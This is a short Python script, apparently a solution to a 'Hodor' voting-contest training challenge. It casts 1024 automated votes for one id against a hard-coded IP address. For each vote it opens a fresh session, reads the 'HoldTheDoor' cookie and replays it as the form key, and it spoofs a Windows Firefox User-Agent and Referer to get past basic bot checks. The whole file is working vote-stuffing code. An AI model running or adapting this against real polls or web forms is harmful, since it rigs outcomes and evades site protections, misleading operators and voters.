#!/usr/bin/python3
'''
This module sends post methods to hodor voting contest
with specific cookies for the `key` input on the `form`
and keeping in mind the Windows agent and Referer for requests.
'''

import requests

url = 'http://158.69.76.135/level2.php'
successes = 0
failures = 0


def v_post(m_get, session, url):
    '''
    This function sends the posts toward an specific `url`
    with an specific `session` and returns the status code
    of the petition.

    ARGUMENTS:
    → m_get {GET method} is the get method that will be used for maintain
    a cookie by session.
    → session {Session} is the session that we want to maintain in the
    petition.
    → url {Host} is the direction where we're going to send petitions.
    '''

    a_windows = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
    cookies = m_get.cookies.get('HoldTheDoor')
    post = session.post(
        url, {'id': '1531', 'holdthedoor': 'Submit', 'key': cookies},
        headers={'User-Agent': a_windows, 'Referer': url})
    print('STATUS → {}\nCOOKIES → {}'.format(
        post.status_code, cookies))
    return (post.status_code)


for p_post in range(1024):
    with requests.Session() as p_session:
        get = p_session.get(url)
        if v_post(get, p_session, url) == 200:
            successes += 1
        else:
            failures += 1

print('Successes → {}\nFailures → {}'.format(successes, failures))
